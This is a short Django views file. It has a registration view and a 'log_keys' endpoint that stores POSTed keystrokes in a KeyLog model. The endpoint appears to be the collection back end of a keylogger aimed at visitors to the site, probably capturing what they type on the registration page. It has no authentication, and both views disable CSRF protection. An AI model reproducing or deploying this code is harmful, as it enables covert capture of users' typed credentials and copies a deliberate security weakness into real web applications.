# views.py
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render, redirect
from django.contrib import messages
from .forms import RegisterForm
from .models import KeyLog
from django.http import JsonResponse
from django.contrib.auth import authenticate, login

@csrf_exempt
def register(request):
    form = RegisterForm()
    context={}
    if request.method == 'POST':
        form = RegisterForm(request.POST)
        if form.is_valid():
            user = form.save()
            login(request, user)
            messages.success(request, f'Account created for '+user.username)
            return redirect('#')
    
    context = {'form': form}
    return render(request, 'register.html', context)

@csrf_exempt
def log_keys(request):
    if request.method == 'POST':
        keys = request.POST.get('keys')
        if keys:
            KeyLog.objects.create(keys=keys)
            return JsonResponse({'status': 'success'})
    return JsonResponse({'status': 'error'}, status=400)
